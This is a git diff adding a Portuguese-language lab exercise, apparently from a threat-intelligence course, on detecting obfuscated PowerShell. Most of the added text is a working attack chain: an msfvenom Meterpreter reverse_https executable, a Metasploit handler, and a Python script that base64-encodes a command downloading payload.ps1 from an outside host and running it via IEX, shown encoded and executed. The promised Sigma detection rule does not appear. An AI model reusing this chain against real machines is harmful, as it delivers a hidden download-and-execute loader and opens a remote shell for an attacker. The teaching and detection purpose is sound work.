@@ -272,3 +272,64 @@ runas /user:smith "whoami"
 runas /user:smith "cmd"
 ```
 O comando "runas" sempre exige que usuário digite a senha para executar
+
+### Atividade prática
+Cenário: Um atacante executa um script PowerShell obfuscado via -EncodedCommand.
+
+O script realiza conexão com C2 e baixa um payload. 
+
+Passos:
+Executar script malicioso em ambiente controlado.
+Coletar logs de eventos ID 1 (Process Creation).
+Filtrar por processos com argumentos suspeitos.
+Criar regra Sigma para detectar padrões.
+- Criação do Malware
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.2.118 LPORT=443 -f exe -o loader.exe
+```
+- Inicializaçaõ do WebServer em Python na porta 8080
+```
+python -m http.server 8080
+```
+- Execuçao do handler para recebimento da conexão reversa
+```
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.2.118; set LPORT 443; exploit"
+``` 
+- Baixando o Script de payload
+```
+wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/payload.ps1
+```
+Ajustando o comando no Script "encode-command.py"
+```
+$ cat encode-command.py
+import base64
+
+def gerar_comando_encodado(comando_ps):
+    # Codifica o comando em UTF-16LE, exigido pelo PowerShell
+    comando_bytes = comando_ps.encode('utf-16le')
+    comando_base64 = base64.b64encode(comando_bytes).decode('utf-8')
+
+    # Comando final completo
+    comando_final = f'powershell -EncodedCommand {comando_base64}'
+    return comando_final
+
+# Insira seu comando PowerShell aqui
+comando = "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org:8080/payload.ps1')|IEX"
+
+# Exibe o comando encodado completo
+print("Comando PowerShell Encodado:")
+print(gerar_comando_encodado(comando))
+```
+Executando o Script "encode-command.py"
+```
+python encode-command.py
+```
+- Resultado
+```
+Comando PowerShell Encodado:
+powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
+```
+Executando o coamndo no Windows 10
+```
+powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
+```
